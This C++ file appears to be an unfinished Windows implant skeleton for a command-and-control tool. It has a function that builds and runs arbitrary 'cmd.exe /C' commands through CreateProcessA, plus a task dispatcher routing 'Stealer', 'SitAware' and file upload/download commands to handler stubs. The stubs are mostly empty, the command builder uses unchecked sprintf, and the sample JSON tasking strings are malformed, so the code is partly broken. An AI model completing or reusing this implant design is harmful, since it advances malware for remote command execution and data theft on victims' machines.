#include <time.h>
#include <stdio.h>
#include <string.h>
#include <unordered_map> // want to include standard c++ stl 
#include <iostream>
#include <windows.h>
#include "nlohmann\json.hpp"

using json = nlohmann::json;

void task_do(json task);
void task_dispatcher(char * body);
/* main execute function*/
char * execute(char * program, char *args, char* outfile){
     LPSTR cmdBuffer = (char *)malloc(1000 * sizeof(char));
    if (cmdBuffer == NULL){
        printf("malloc failed");
        exit(1);
    }
    int j = sprintf(cmdBuffer, "cmd.exe /C ");
     j += sprintf(cmdBuffer + j, program );
     j += sprintf(cmdBuffer+ j, " ");
    j += sprintf(cmdBuffer + j, args );
    j += sprintf(cmdBuffer+ j, " ");
    j += sprintf(cmdBuffer + j, " > ");
    j += sprintf(cmdBuffer + j, outfile);
    j += sprintf(cmdBuffer + j, "\0");
    // Values needed for CreateProcessA
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    // Dead squirrels
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    // Dead squirrels 
    ZeroMemory(&pi, sizeof(pi));
    int retVal;

    retVal = CreateProcessA(    // No module name (use command line)
        NULL,        // Command line
        cmdBuffer,
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to TRUE binheritance
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi ) ;          // Pointer to PROCESS_INFORMATION structure
    
    if (retVal == 0){
        printf("Create process failed\n");
        exit(0);
    }
    WaitForSingleObject( pi.hProcess, INFINITE );
    // Close process and thread handles. 
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
    free(cmdBuffer);
    return NULL;
}


/* start of implant functions*/

void  FileUpload(std::string args){
}

void FileDownload(std::string args){}

void SitAware(std::string args){
    //implant id, computer name, usernmae, GUI, integrity, ip address, session key?, last seen
    //expected checkin -
    printf("WHOAMI\n"); 


}

void Stealer(std::string args){
    printf("DOING THIEVERY\n");
}


/* Dispatch Table Init*/
using pfunc = void (*)(std::string);
std::unordered_map<std::string, pfunc > dispatch_table;

//make global results array?
//

void DispatchTableInit(){
    dispatch_table["SitAware"] = Stealer;
    dispatch_table["FileDown"] = FileDownload;
    dispatch_table["FileUp"] = FileUpload;
    dispatch_table["Stealer"] = Stealer;
    }

char ** jsonParse(){
    const char * ex = "{\"cmd\": \"Stealer\", \"args\": \"\"}";
    json tasks = json::parse(ex);
    std::cout << tasks["cmd"];
    return NULL;

}

/*task functions*/
//tasks are lists of tasks structured [cmd: , args:, taskid: ]
void tasks_dispatch(const char * body){
    
    json tasks = json::parse(body); //json array of tasks
    json tasks_arr = tasks["Tasks"];
    int numTasks = tasks["NumTasks"];
    char * comm;
    char * args;
    json task;
    for (int i = 0; i < numTasks; i ++){
        task = json::parse( tasks_arr[i]);
        task_do(task);
        //get results
    }
   
}

//create results arr and return

void task_do(json task){
    std::cout << task["cmd"] << '\n';
    std::cout << task["args"] << '\n';

//get cmd, args, id
//choose execute

// read output from file and add to global res

}


void tasking();

/* other helper functions necessary*/
std::string readFile(char * fileName){
     //GetFileSize
    DWORD fileSize;
    char* buffer;
    fflush(stdin);
    FILE * infile = fopen(fileName, "r");
    int size;
    
    fseek(infile, 0L, SEEK_END);
    size = ftell(infile);
    fseek(infile, 0L, SEEK_SET);

    buffer = (char *)malloc(size);
    
    fread(buffer,sizeof(char *), size, infile );
    std::string buf;
    buf = std::string(buffer);
    return buf;
    
}


int main(int argc, char* argv[]){

    DispatchTableInit(); //create the map of strings to funcrtions
    //example of how to call the right function
    pfunc p = dispatch_table["Stealer"];
    std::string args = "";
    //(*p)(args);
    const char * ex = "{\"Tasks: [  {  \"{\"cmd\": \"Stealer\", \"args\": \"\"}, {  {\"cmd\": \"SitAware\", \"args\": \"\"}}  }   ]\", \"NumTasks\": 2}";
    tasks_dispatch(ex);
    



    return 0;
}